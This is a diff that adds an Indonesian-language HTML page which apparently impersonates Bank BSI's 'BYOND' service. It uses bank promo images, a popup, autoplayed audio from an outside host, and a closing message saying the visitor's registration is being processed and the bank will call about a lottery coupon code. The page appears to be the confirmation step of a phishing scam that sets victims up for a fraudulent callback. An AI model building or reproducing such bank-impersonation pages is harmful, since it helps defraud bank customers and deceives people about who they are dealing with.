@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selamat Datang Di Layanan Resmi</title>
+    <link rel="stylesheet" href="assets/css/main.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        /* Preloader overlay */
+        #preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            z-index: 2000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        /* Loader styles */
+        .loader {
+          width: 50px;
+          aspect-ratio: 1;
+          display: grid;
+        }
+        .loader::before,
+        .loader::after {    
+          content:"";
+          grid-area: 1/1;
+          --c:no-repeat radial-gradient(farthest-side,#25b09b 92%,#0000);
+          background: 
+            var(--c) 50%  0, 
+            var(--c) 50%  100%, 
+            var(--c) 100% 50%, 
+            var(--c) 0    50%;
+          background-size: 12px 12px;
+          animation: l12 1s infinite;
+        }
+        .loader::before {
+          margin: 4px;
+          filter: hue-rotate(45deg);
+          background-size: 8px 8px;
+          animation-timing-function: linear;
+        }
+        @keyframes l12 { 
+          100%{transform: rotate(.5turn)}
+        }
+        /* icon wrapper */
+        .input-icon{position:relative;}
+        .input-icon i{
+            position:absolute;
+            left:12px;
+            top:50%;
+            transform:translateY(-50%);
+            color:#25b09b;
+            font-size:16px;
+        }
+            /* Layout padding to avoid overlap */
+        body{
+            padding-top:70px; /* navbar height + margin */
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            min-height:100vh;
+        }
+        main.login-container{flex:1;}
+
+        /* Carousel */
+        .carousel{
+            width:100%;
+            position:relative;
+            padding-top:56.25%; /* 16:9 ratio */
+            overflow:hidden;
+            margin-bottom:8px;
+        }
+        .carousel img{
+            position:absolute;
+            top:0;
+            left:0;
+            width:100%;
+            height:100%;
+            object-fit:cover;
+            opacity:0;
+            transition:opacity .5s ease;
+        }
+        .carousel img.active{opacity:1;}
+
+        /* Popup overlay */
+        .popup-overlay{
+            position:fixed;
+            top:0;left:0;width:100%;height:100%;
+            background:rgba(0,0,0,0.5);
+            display:flex;align-items:center;justify-content:center;
+            z-index:3000;
+        }
+        .popup-content{
+            background:#fff;
+            padding:24px 32px;
+            border-radius:12px;
+            text-align:center;
+            box-shadow:0 6px 18px rgba(0,0,0,.25);
+        }
+        .popup-content p{margin-bottom:16px;font-weight:600;color:#157665;}
+        .popup-content button{
+            padding:10px 24px;border:none;border-radius:6px;background:#25b09b;color:#fff;font-size:15px;cursor:pointer;
+        }
+        .popup-content button:hover{background:#1d8b79;}
+
+        .message-card{
+            max-width:480px;margin:40px 16px;padding:32px 24px;background:rgba(255,255,255,0.9);border-radius:16px;box-shadow:0 8px 20px rgba(0,0,0,.15);text-align:center;color:#157665;font-weight:500;
+        }
+
+        /* Removed duplicate card styles */
+        .login-container{
+            position:relative;
+            width:90%;
+            max-width:420px;
+            margin:calc(70px + 2vh) 16px;
+            padding:40px 24px 32px;
+            background:rgba(255,255,255,0.85);
+            backdrop-filter:blur(8px);
+            border:1px solid rgba(255,255,255,0.4);
+            border-radius:16px;
+            box-shadow:0 8px 20px rgba(0,0,0,.15);
+            text-align:center;
+            overflow:hidden;
+        }
+        .login-container h2{
+            margin-bottom:24px;
+            font-weight:600;
+            color:#157665;
+        }
+        .form-group input{border-radius:8px;}
+
+        /* decorative top gradient bar */
+        .login-container::before{
+            content:'';
+            position:absolute;
+            top:0;
+            left:0;
+            width:100%;
+            height:7px;
+            background:linear-gradient(90deg,#25b09b 0%,#1d8b79 100%);
+        } 
+
+        @media (max-width:600px){
+            .login-container{margin-top:24px;}
+        }
+
+        @media (min-width:600px){
+            .login-container{max-width:500px;}
+        }
+    </style>
+    <script>
+        window.addEventListener('load', function(){
+            const pre = document.getElementById('preloader');
+            if(pre){ pre.style.display = 'none'; }
+        });
+        document.addEventListener('DOMContentLoaded', ()=>{
+            // show popup
+            const overlay=document.getElementById('popupOverlay');
+            const okBtn=document.getElementById('popupOk');
+            const msgCard=document.getElementById('messageCard');
+            const audio = new Audio('https://img-host-three.vercel.app/audio.mp3');
+            
+            overlay.style.display='flex';
+            okBtn.addEventListener('click',()=>{
+                audio.play().catch(error => console.log('Error playing audio:', error));
+                overlay.style.display='none';
+                msgCard.style.display='block';
+            });
+            const slides=document.querySelectorAll('.carousel img');
+            let idx=0;
+            setInterval(()=>{
+                slides[idx].classList.remove('active');
+                idx = (idx+1)%slides.length;
+                slides[idx].classList.add('active');
+            },2000);
+        });
+    </script>
+</head>
+<body>
+    <div id="preloader"><div class="loader"></div></div>
+    <nav class="navbar"></nav>
+    <!-- Popup overlay -->
+    <div id="popupOverlay" class="popup-overlay" style="display:none;">
+        <div class="popup-content">
+            <p>Lanjut Proses Penyelesaian</p>
+            <button id="popupOk">OK</button>
+        </div>
+    </div>
+
+    <!-- Carousel -->
+    <div class="carousel">
+        <img src="https://i.ytimg.com/vi/1KAFORx-2jw/maxresdefault.jpg" class="active" alt="slide1">
+        <img src="https://www.uin-suska.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-13-at-11.39.12.jpeg" alt="slide2">
+        <img src="https://www.bankbsi.co.id/storage/promos/4UD6Gd1ID6aBieIPHnnnUvZ9xAZjMR2BTYiaTVWc.jpg" alt="slide3">
+    </div>
+
+    <!-- Message Card -->
+    <main id="messageCard" class="message-card" style="display:none;">
+        Terimakasih Telah Mendaftar Dilayanan BYOND By BSI, Pendaftaran Anda Sedang Diproses, Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank BSI, Untuk Proses Cetak Kode Kupon Undian Anda.
+    </main>      
+</body>
+</html>
